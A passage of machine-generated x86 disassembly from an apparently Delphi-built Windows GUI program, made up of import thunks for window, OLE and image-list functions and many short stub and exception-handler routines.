jmp [ GetWindowRect@IAT ]
GetWindowTextW
jmp [ GetWindowTextW@IAT ]
__imp_GetWindowThreadProcessId
jmp [ GetWindowThreadProcessId@IAT ]
InflateRect
jmp [ InflateRect@IAT ]
InsertMenuItemW
jmp [ InsertMenuItemW@IAT ]
IntersectRect
jmp [ IntersectRect@IAT ]
InvalidateRect
jmp [ InvalidateRect@IAT ]
IsChild
jmp [ IsChild@IAT ]
IsDialogMessageA
jmp [ IsDialogMessageA@IAT ]
IsDialogMessageW
jmp [ IsDialogMessageW@IAT ]
IsIconic
jmp [ IsIconic@IAT ]
IsWindow
jmp [ IsWindow@IAT ]
IsWindowUnicode
jmp [ IsWindowUnicode@IAT ]
IsZoomed
jmp [ IsZoomed@IAT ]
KillTimer
jmp [ KillTimer@IAT ]
LoadBitmapW
jmp [ LoadBitmapW@IAT ]
LoadIconW
jmp [ LoadIconW@IAT ]
LoadStringW
jmp [ LoadStringW@IAT ]
MapVirtualKeyW
jmp [ MapVirtualKeyW@IAT ]
MessageBoxW
jmp [ MessageBoxW@IAT ]
MsgWaitForMultipleObjects
jmp [ MsgWaitForMultipleObjects@IAT ]
MsgWaitForMultipleObjectsEx
jmp [ MsgWaitForMultipleObjectsEx@IAT ]
OffsetRect
jmp [ OffsetRect@IAT ]
PeekMessageA
jmp [ PeekMessageA@IAT ]
PeekMessageW
jmp [ PeekMessageW@IAT ]
PostQuitMessage
jmp [ PostQuitMessage@IAT ]
RedrawWindow
jmp [ RedrawWindow@IAT ]
RegisterClassW
jmp [ RegisterClassW@IAT ]
RegisterClipboardFormatW
jmp [ RegisterClipboardFormatW@IAT ]
ReleaseCapture
jmp [ ReleaseCapture@IAT ]
ReleaseDC
jmp [ ReleaseDC@IAT ]
RemoveMenu
jmp [ RemoveMenu@IAT ]
sub_40c472
push eax
push edx
push ecx
push rw-data
jmp sub_40c034
ScrollWindow
jmp [ ScrollWindow@IAT ]
SendMessageA
jmp [ SendMessageA@IAT ]
SendMessageW
jmp [ SendMessageW@IAT ]
SetActiveWindow
jmp [ SetActiveWindow@IAT ]
SetCapture
jmp [ SetCapture@IAT ]
SetClassLongW
jmp [ SetClassLongW@IAT ]
SetCursorPos
jmp [ SetCursorPos@IAT ]
SetForegroundWindow
jmp [ SetForegroundWindow@IAT ]
SetMenuItemInfoW
jmp [ SetMenuItemInfoW@IAT ]
SetParent
jmp [ SetParent@IAT ]
SetScrollInfo
jmp [ SetScrollInfo@IAT ]
SetScrollPos
jmp [ SetScrollPos@IAT ]
SetScrollRange
jmp [ SetScrollRange@IAT ]
SetTimer
jmp [ SetTimer@IAT ]
SetWindowPlacement
jmp [ SetWindowPlacement@IAT ]
SetWindowsHookExW
jmp [ SetWindowsHookExW@IAT ]
ShowScrollBar
jmp [ ShowScrollBar@IAT ]
__imp_SystemParametersInfoW
jmp [ SystemParametersInfoW@IAT ]
__imp_SystemParametersInfoW_40c578
jmp [ SystemParametersInfoW@IAT ]
TrackPopupMenu
jmp [ TrackPopupMenu@IAT ]
TranslateMDISysAccel
jmp [ TranslateMDISysAccel@IAT ]
TranslateMessage
jmp [ TranslateMessage@IAT ]
UnhookWindowsHookEx
jmp [ UnhookWindowsHookEx@IAT ]
UnregisterClassW
jmp [ UnregisterClassW@IAT ]
UpdateWindow
jmp [ UpdateWindow@IAT ]
WaitMessage
jmp [ WaitMessage@IAT ]
WindowFromPoint
jmp [ WindowFromPoint@IAT ]
CreateWindowExW
jmp [ CreateWindowExW@IAT ]
j_sub_40c772
jmp [ rw-data ]
sub_40c772
push eax
push edx
push ecx
push rw-data
jmp sub_40c034
j_sub_40c786
jmp [ rw-data ]
sub_40c786
push eax
push edx
push ecx
push rw-data
jmp sub_40c034
j_sub_40c79a
jmp [ rw-data ]
sub_40c79a
push eax
push edx
push ecx
push rw-data
jmp sub_40c034
sub_40c7e4
cmp [ rw-data ] 0x6
jl r-xdata
mov eax 0x1f4
retn
mov eax 0x1f8
retn
sub_40c7fc
inc [ rw-data ]
jne r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_40c9e8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
push ecx
push edx
push eax
call __imp_SendMessageW
pop ebx
pop ebp
retn 0x4
CoInitialize
jmp [ CoInitialize@IAT ]
CoUninitialize
jmp [ CoUninitialize@IAT ]
CoCreateInstance
jmp [ CoCreateInstance@IAT ]
StringFromCLSID
jmp [ StringFromCLSID@IAT ]
CoTaskMemFree
jmp [ CoTaskMemFree@IAT ]
OleInitialize
jmp [ OleInitialize@IAT ]
OleUninitialize
jmp [ OleUninitialize@IAT ]
SysFreeString
jmp [ SysFreeString@IAT ]
GetErrorInfo
jmp [ GetErrorInfo@IAT ]
ImageList_Create
jmp [ ImageList_Create@IAT ]
ImageList_Destroy
jmp [ ImageList_Destroy@IAT ]
ImageList_GetImageCount
jmp [ ImageList_GetImageCount@IAT ]
ImageList_SetImageCount
jmp [ ImageList_SetImageCount@IAT ]
ImageList_ReplaceIcon
jmp [ ImageList_ReplaceIcon@IAT ]
ImageList_SetBkColor
jmp [ ImageList_SetBkColor@IAT ]
ImageList_GetBkColor
jmp [ ImageList_GetBkColor@IAT ]
ImageList_SetOverlayImage
jmp [ ImageList_SetOverlayImage@IAT ]
ImageList_Replace
jmp [ ImageList_Replace@IAT ]
ImageList_Remove
jmp [ ImageList_Remove@IAT ]
ImageList_GetIcon
jmp [ ImageList_GetIcon@IAT ]
ImageList_LoadImageW
jmp [ ImageList_LoadImageW@IAT ]
ImageList_BeginDrag
jmp [ ImageList_BeginDrag@IAT ]
ImageList_EndDrag
jmp [ ImageList_EndDrag@IAT ]
ImageList_DragEnter
jmp [ ImageList_DragEnter@IAT ]
ImageList_DragLeave
jmp [ ImageList_DragLeave@IAT ]
ImageList_DragMove
jmp [ ImageList_DragMove@IAT ]
ImageList_DragShowNolock
jmp [ ImageList_DragShowNolock@IAT ]
ImageList_GetDragImage
jmp [ ImageList_GetDragImage@IAT ]
ImageList_Read
jmp [ ImageList_Read@IAT ]
ImageList_Write
jmp [ ImageList_Write@IAT ]
ImageList_GetIconSize
jmp [ ImageList_GetIconSize@IAT ]
ImageList_SetIconSize
jmp [ ImageList_SetIconSize@IAT ]
ImageList_GetImageInfo
jmp [ ImageList_GetImageInfo@IAT ]
_TrackMouseEvent
jmp [ _TrackMouseEvent@IAT ]
FlatSB_GetScrollInfo
jmp [ FlatSB_GetScrollInfo@IAT ]
FlatSB_GetScrollPos
jmp [ FlatSB_GetScrollPos@IAT ]
FlatSB_SetScrollInfo
jmp [ FlatSB_SetScrollInfo@IAT ]
FlatSB_SetScrollPos
jmp [ FlatSB_SetScrollPos@IAT ]
InitializeFlatSB
jmp [ InitializeFlatSB@IAT ]
sub_40d304
movzx eax ax
cmp eax 0xff
setle al
retn
sub_40d404
movzx eax ax
cmp eax 0x7f
setle al
retn
sub_40d979
mov ebx 0x440040da
add ah dh
dec [ eax ]
fild [ eax ]
inc esp
add ah dh
[ ebx + ebx * 8 ]
inc eax
add [ eax + eax - 0xc ] al
[ esi - 0x25 ]
sub_40d9c3
inc eax
add [ ecx ] al
hlt
sub_40f486
fxtract
inc eax
add [ edx ] al
hlt
sub_40fa91
cmp bh ah
inc eax
add [ ebx ] al
hlt
sub_40fafa
add [ ecx ] al
inc edx
add ah dh
[ eax + eax + 0x41 ]
sub_40fb04
add [ edx ] al
hlt
sub_41035c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
sub_410ccc
cmp ax 0x100
jae r-xdata
xor eax eax
retn
movzx eax al
bt [ edx ] eax
jb r-xdata
mov al 0x1
retn
sub_4110c0
cmp cl 0x1
jne r-xdata
call sub_410fc4
retn
call sub_411254
retn
sub_41117c
jmp sub_405fd0
sub_411183
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_411244
jmp sub_405fd0
sub_41124b
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_411310
jmp sub_405fd0
sub_411317
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4113d2
jmp sub_405fd0
sub_4113d9
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_411570
jmp sub_405fd0
sub_411577
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_411855
jmp sub_405fd0
sub_41185c
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_411ed4
jmp sub_405fd0
sub_411edb
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_411ee4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_411e6c
pop esi
pop ebx
retn
sub_412208
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
cmp eax 0xffffffff
je r-xdata
pop ebx
retn
push eax
call FindClose
mov [ ebx + 0x1c ] 0xffffffff
sub_4122b3
jmp sub_405fd0
sub_4122ba
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_41238c
jmp sub_405fd0
sub_412393
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_412570
cmp [ eax ] 0x0
je r-xdata
retn
add eax 0x2
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax 0x2
retn
sub_41258c
push esi
mov esi eax
add ecx ecx
xchg edx eax
call sub_4043c8
mov eax esi
pop esi
retn
sub_412684
jmp sub_405fd0
sub_41268b
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41279c
jmp r-xdata
movzx ecx [ eax ]
test cx cx
jne r-xdata
cmp dx cx
je r-xdata
test dx dx
je r-xdata
retn
add eax 0x2
xor eax eax
sub_4128a0
push ebx
mov ebx eax
add ebx ebx
add ebx 0x4
mov eax ebx
call sub_404204
mov [ eax ] ebx
add eax 0x4
pop ebx
retn
sub_4128b8
call sub_4128a0
retn
sub_4128c0
sub eax 0x4
mov eax [ eax ]
sub eax 0x4
retn
sub_4128f8
test eax eax
je r-xdata
retn
sub eax 0x4
mov edx [ eax ]
call sub_404220
sub_412b8e
jmp sub_405fd0
sub_412b95
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_412c10
jmp sub_405fd0
sub_412c17
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_412c20
push ebx
mov ecx [ rw-data ]
cmp [ ecx ] 0x0
je r-xdata
mov al 0x10
call sub_404360
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
pop ebx
retn
sub_413024
push ebx
push eax
lea eax [ ebp - 0x10 ]
mov ebx [ ebp - 0x4 ]
call sub_406d54
pop eax
pop ebx
retn
sub_4131a8
cmp [ ebp - 0x24 ] 0x0
je r-xdata
retn
mov ax 0x2d
stosw [ edi ]
sub_41332e
push esi
mov esi [ ebp - 0x8 ]
test esi esi
je r-xdata
pop esi
retn
mov ecx [ esi - 0x4 ]
[ edi ] [ esi ]
sub_41368b
lodsb [ esi ]
or al al
je r-xdata
dec esi
retn
cmp al 0x20
je sub_41368b
sub_41373c
jmp sub_405fd0
sub_413743
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4137ac
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_407134
mov edx esi
xor ecx ecx
call sub_4136e8
pop esi
pop ebx
retn
sub_4138a8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_407134
mov edx esi
mov cl 0x1
call sub_4136e8
pop esi
pop ebx
retn
sub_413d30
jmp sub_405fd0
sub_413d37
pop ecx
pop ebp
retn
sub_413f9c
jmp sub_405fd0
sub_413fa3
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4140b1
jmp sub_405fd0
sub_4140b8
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414899
jmp sub_405fd0
sub_4148a0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41499b
jmp sub_405fd0
sub_4149a2
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_414a5c
jmp sub_405fd0
sub_414a63
movzx eax [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_414b3d
jmp sub_405fd0
sub_414b44
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414bea
jmp sub_405fd0
sub_414bf1
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_414c83
jmp sub_405fd0
sub_414c8a
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_414d47
jmp sub_405fd0
sub_414d4e
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_415189
jmp sub_405fd0
sub_415190
movzx eax [ ebp - 0x11 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41544a
jmp sub_405fd0
sub_415451
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4154da
jmp sub_405fd0
sub_4154e1
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4156cb
jmp sub_405fd0
sub_4156d2
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415933
jmp sub_405fd0
sub_41593a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4159e5
jmp sub_405fd0
sub_4159ec
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_415a8f
jmp sub_405fd0
sub_415a96
pop esi
pop ecx
pop ebp
retn
sub_415cdf
jmp sub_405fd0
sub_415ce6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415d6c
test eax eax
je r-xdata
retn
sub eax 0x1000
sub_415f24
jmp sub_405fd0
sub_415f2b
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41608d
jmp sub_405fd0
sub_416094
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_416142
jmp sub_405fd0
sub_4161bb
jmp sub_405fd0
sub_416288
jmp sub_405fd0
sub_41631c
jmp sub_405fd0
sub_4163ec
jmp sub_405fd0
sub_41646d
jmp sub_405fd0
sub_41654e
jmp sub_405fd0
sub_4165ea
jmp sub_405fd0
sub_416658
jmp r-xdata
mov edx [ eax + 0xc ]
test edx edx
jne r-xdata
mov eax edx
retn
sub_416690
test eax eax
je sub_4060b0
mov [ eax + 0x14 ] 0x1
jmp sub_4060b0
sub_4166a1
retn
sub_4166a4
test eax eax
je sub_4060b0
mov [ eax + 0x14 ] 0x1
jmp sub_4060b0
sub_4166b5
retn
sub_41670c
mov [ eax + 0x10 ] edx
retn
sub_41675b
inc [ edx ]
add [ eax ] al
add [ 0xa00 ] cl
add [ eax ] al
add [ eax + 0x74001878 ] al
add eax 0xfeee31e8
inc ebx
call sub_4166e4
retn
sub_416a1a
pop ebx
retn
sub_416ab8
jmp sub_405fd0
sub_416abf
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_416ac8
mov esp ecx
mov [ esp ] edx
mov ebp [ ebp ]
jmp sub_4060b0
sub_416ad5
retn
sub_416ad8
push ebp
mov ebp esp
call sub_416a1c
lea ecx [ ebp + 0x8 ]
add ecx 0x8
mov edx [ ebp + 0x8 ]
call sub_416ac8
pop ebp
retn 0x4
sub_416af4
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
retn
sub_416b8c
push ebx
mov ebx eax
mov eax ebx
call sub_416b0c
movzx eax al
movzx eax [ eax * 8 + rw-data ]
mov eax [ eax * 4 + rw-data ]
pop ebx
retn
sub_416d67
jmp sub_405fd0
sub_416d6e
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_416e42
jmp sub_405fd0
sub_416e49
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_416e74
call sub_415f68
mov eax 0x1
call sub_4067d4
sub_416f94
inc [ rw-data ]
jne r-xdata
retn
call sub_416f14
sub_417114
mov eax [ rw-data ]
mov [ eax ] rw-data
retn
sub_417224
cmp eax [ rw-data ]
jl r-xdata
mov al 0x1
retn
cmp eax [ rw-data ]
jne r-xdata
xor eax eax
retn
cmp edx [ rw-data ]
jle r-xdata
sub_4172fd
jmp sub_405fd0
sub_41731a
jmp sub_405fd0
sub_417321
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_41742f
jmp sub_405fd0
sub_417436
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4174d4
jmp sub_405fd0
sub_4174db
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_4174e4
call sub_417440
retn
sub_4175b9
jmp sub_405fd0
sub_4175c0
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4175cc
call sub_4174ec
retn
sub_4176e1
jmp sub_405fd0
sub_4176e8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4177c3
jmp sub_405fd0
sub_4177ca
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4177d4
call sub_4176f4
retn
sub_4178dc
jmp sub_405fd0
sub_4178e3
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4178ec
call sub_4177dc
retn
sub_4179d8
jmp sub_405fd0
sub_4179df
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_417a73
jmp sub_405fd0
sub_417a7a
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_417b34
jmp sub_405fd0
sub_417b3b
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_417c62
jmp sub_405fd0
sub_417c69
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_417c74
call sub_4127e8
retn
sub_417c7c
call sub_4127b8
retn
sub_417c84
call sub_41279c
retn
sub_41807e
jmp sub_405fd0
sub_418085
pop ebx
mov esp ebp
pop ebp
retn
sub_41825f
[ eax + 0x8004181 ]
sub_418394
retn
sub_41854f
jmp sub_405fd0
sub_418556
pop ebx
mov esp ebp
pop ebp
retn
sub_41855c
push ebx
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_4184b8
sub_418638
mov edx 0xffffffff
xchg edx eax
[ edx ] eax
dec eax
retn
sub_418644
xchg [ eax ] edx
mov eax edx
retn
sub_4186ac
push ebp
mov ebp esp
push ecx
call GetCurrentThreadId
mov [ ebp - 0x2 ] ax
movzx eax [ ebp - 0x2 ]
xor al [ ebp - 0x1 ]
and al 0xf
pop ecx
pop ebp
retn
sub_418740
xor eax eax
mov [ edx ] eax
retn
sub_418748
mov eax [ edx ]
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov eax [ edx ]
xor edx edx
mov [ eax + 0x8 ] edx
retn
sub_418864
mov eax [ eax + 0x10 ]
push eax
call SetEvent
retn
sub_41888c
mov edx [ eax + 0x18 ]
push edx
mov eax [ eax + 0x14 ]
push eax
call WaitForSingleObject
retn
sub_418a70
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4055f0
retn
sub_418b1b
jmp sub_405fd0
sub_418b22
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_418b90
jmp sub_405fd0
sub_418b97
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418bb5
mov eax [ ebp - 0xc ]
push eax
call SetErrorMode
retn
sub_418bae
jmp sub_405fd0
sub_418bb5
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_418c55
jmp sub_405fd0
sub_418c5c
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_418cd1
jmp sub_405fd0
sub_418cd8
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
sub_418ce0
inc [ rw-data ]
jne r-xdata
retn
mov eax [ r-xdata ]
call sub_418cf4
sub_418ef2
jmp sub_405fd0
sub_418ef9
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41903f
jmp sub_405fd0
sub_419046
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_419142
jmp sub_405fd0
sub_419149
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41939d
jmp sub_405fd0
sub_4193a4
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41953d
jmp sub_405fd0
sub_419544
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4198f0
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_419a84
retn
sub_419984
jmp sub_405fd0
sub_41998b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_419b48
push 0x0
push 0x0
push 0x0
push 0x0
push ecx
push edx
mov edx [ eax + 0x14 ]
push edx
mov eax [ eax + 0xc ]
push eax
call WideCharToMultiByte
retn
sub_419b84
push 0x0
push 0x0
push ecx
push edx
mov edx [ eax + 0x10 ]
push edx
mov eax [ eax + 0xc ]
push eax
call MultiByteToWideChar
retn
sub_419bb8
inc edx
imul edx [ eax + 0x8 ]
mov eax edx
retn
sub_419bc0
mov eax edx
retn
sub_419bc4
push ebx
mov ebx edx
push 0x0
mov eax ebx
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40891c
add esp 0x4
pop ebx
retn
sub_419c1c
call sub_419b48
retn
sub_419c24
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
call sub_419b60
pop ebx
pop ebp
retn 0x8
sub_419c3c
call sub_419b84
retn
sub_419c44
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
call sub_419b98
pop ebx
pop ebp
retn 0x8
sub_419c5c
lea eax [ edx + edx * 2 ]
add eax 0x2
retn
sub_419c64
mov eax edx
retn
sub_419ca8
inc edx
lea eax [ edx + edx * 2 ]
retn
sub_419cb0
lea eax [ edx + 0x1 ]
retn
sub_419ce4
test dl dl
je r-xdata
mov [ eax + 0x4 ] 0x0
mov [ eax + 0x8 ] 0x4
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_419d10
mov eax ecx
add eax eax
retn
sub_419d34
mov eax ecx
sar eax 0x1
jns r-xdata
retn
adc eax 0x0
sub_419d60
inc edx
mov eax edx
add eax eax
retn
sub_419d68
mov eax edx
sar eax 0x1
jns r-xdata
and edx 0x1
add eax edx
inc eax
retn
adc eax 0x0
VariantChangeType
jmp [ VariantChangeType@IAT ]
sub_41a3d8
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x10
sub_41a43e
jmp sub_405fd0
sub_41a445
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_41a4aa
jmp sub_405fd0
sub_41a4b1
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_41a516
jmp sub_405fd0
sub_41a51d
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_41a582
jmp sub_405fd0
sub_41a589
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_41a5ee
jmp sub_405fd0
sub_41a5f5
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_41a66d
jmp sub_405fd0
sub_41a674
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
sub_41a6e0
jmp sub_405fd0
sub_41a6e7
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_41a752
jmp sub_405fd0
sub_41a759
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_41a7c8
jmp sub_405fd0
sub_41a7cf
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
SafeArrayCreate
jmp [ SafeArrayCreate@IAT ]
SafeArrayGetLBound
jmp [ SafeArrayGetLBound@IAT ]
SafeArrayGetUBound
jmp [ SafeArrayGetUBound@IAT ]
sub_41ab3c
inc [ rw-data ]
retn
sub_41ba2e
jmp sub_405fd0
sub_41ba35
pop ecx
pop ebp
retn
sub_41bac7
jmp sub_405fd0
sub_41bace
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41bb1e
jmp sub_405fd0
sub_41bb25
pop ecx
pop ebp
retn
sub_41bb72
jmp sub_405fd0
sub_41bb79
pop ecx
pop ebp
retn
sub_41bc0b
jmp sub_405fd0
sub_41bc12
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41bc62
jmp sub_405fd0
sub_41bc69
pop ecx
pop ebp
retn
sub_41beb1
jmp sub_405fd0
sub_41beb8
pop ebx
mov esp ebp
pop ebp
retn
sub_41bfce
jmp sub_405fd0
sub_41bfd5
pop ecx
pop ebp
retn
sub_41bfd8
push ebx
mov ebx eax
mov eax ebx
call sub_41c288
mov [ ebx ] 0x1
pop ebx
retn
sub_41c29c
push eax
call sub_41c288
pop eax
retn
sub_41c4fc
call sub_41c5f0
retn
sub_41c690
jmp sub_405fd0
sub_41c697
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41c6de
jmp sub_405fd0
sub_41c6e5
pop ebx
pop ecx
pop ebp
retn
sub_41c72a
jmp sub_405fd0
sub_41c731
pop ebx
pop ecx
pop ebp
retn
sub_41c776
jmp sub_405fd0
sub_41c77d
pop ebx
pop ecx
pop ebp
retn
sub_41c7c2
jmp sub_405fd0
sub_41c7c9
pop ebx
pop ecx
pop ebp
retn
sub_41c80e
jmp sub_405fd0
sub_41c815
pop ebx
pop ecx
pop ebp
retn
sub_41cbff
jmp sub_405fd0
sub_41cc06
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_41cca0
jmp sub_405fd0
sub_41cca7
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_41d175
jmp sub_405d1c
sub_41d234
jmp sub_405d1c
sub_41d2df
jmp sub_405d1c
sub_41d3db
jmp sub_405d1c
sub_41d4b8
jmp sub_405d1c
sub_41d5a4
jmp sub_405d1c
sub_41d762
jmp sub_405fd0
sub_41d769
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
sub_41d7cb
jmp sub_405fd0
sub_41d7d2
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_41dc82
jmp sub_405d1c
sub_41ddeb
jmp sub_405d1c
sub_41ded2
jmp sub_405fd0
sub_41ded9
movzx eax [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_41df78
jmp sub_405fd0
sub_41df7f
movzx eax [ ebp - 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_41e370
call sub_41dfd4
neg al
sbb eax eax
neg eax
retn
sub_41e431
jmp sub_405fd0
sub_41e438
fld [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_41e4e1
jmp sub_405fd0
sub_41e4e8
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_41eadb
jmp sub_405d1c
sub_41ebe8
jmp sub_405fd0
sub_41ebef
fld [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_41ecf9
jmp sub_405fd0
sub_41ed00
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_41f1e4
jmp sub_405fd0
sub_41f1eb
fild [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_41f2f5
jmp sub_405fd0
sub_41f2fc
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_41f8d4
jmp sub_405fd0
sub_41f8db
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41f971
jmp sub_405fd0
sub_41f978
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f995
lea eax [ ebp - 0x14 ]
call j_sub_4068a0
retn
sub_41f98e
jmp sub_405fd0
sub_41f995
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41f9f2
jmp sub_405fd0
sub_41f9f9
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41fa75
jmp sub_405fd0
sub_420122
jmp sub_405fd0
sub_420129
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4201cd
jmp sub_405fd0
sub_4201d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4201f6
lea eax [ ebp - 0x18 ]
mov edx 0x2
call j_sub_4068c4
retn
sub_4201ef
jmp sub_405fd0
sub_4201f6
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420252
jmp sub_405fd0
sub_420259
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420309
jmp sub_405fd0
sub_42032b
jmp sub_405fd0
sub_420332
movzx eax [ ebp - 0x9 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_42092b
jmp sub_405fd0
sub_420932
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42098e
jmp sub_405fd0
sub_420995
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420a37
jmp sub_405fd0
sub_420a54
jmp sub_405fd0
sub_420a5b
movzx eax [ ebp - 0x9 ]
pop ebx
mov esp ebp
